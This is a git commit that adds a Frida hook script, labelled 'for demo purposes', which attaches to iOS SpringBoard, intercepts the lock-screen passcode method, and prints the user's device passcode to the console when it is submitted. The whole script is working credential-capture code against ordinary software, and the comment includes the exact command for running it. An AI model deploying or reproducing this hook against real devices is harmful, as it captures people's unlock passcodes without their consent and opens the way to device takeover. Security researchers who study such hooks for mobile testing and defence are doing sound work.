6b1d560cbc31d9fdf82358ec5de2c0fdd60336f1
Quentin Kaiser <quentin@gremwell.com>
2020-04-21 19:14:22 +0200

    iOS device passcode capture by hooking SpringBoard. For demo purposes.

---
+++ ios_springboard_passcode.js
@@ -0,0 +1,22 @@
+/**
+*
+* Frida hook to capture iOS device's passcode when user submit it.
+* You need to attach to SpringBoard to do so:
+* frida -U -n SpringBoard -l ios_springboard_passcode.js
+*
+* @Author: Quentin Kaiser <kaiserquentin@gmail.com>
+*
+*/
+var device_passcode = "";
+var passcode = ObjC.classes.SBUIPasscodeLockViewWithKeyboard["- passcode"];
+Interceptor.attach(passcode.implementation, {
+    onLeave: function(retval) {
+        var cur_passcode = new ObjC.Object(retval).toString();
+        if(cur_passcode.length > 0){
+            device_passcode = cur_passcode;
+        } else {
+            // user pressed submit, time to print out the passcode
+            console.log("[!] Device passcode is " + device_passcode);
+        }
+    }
+});
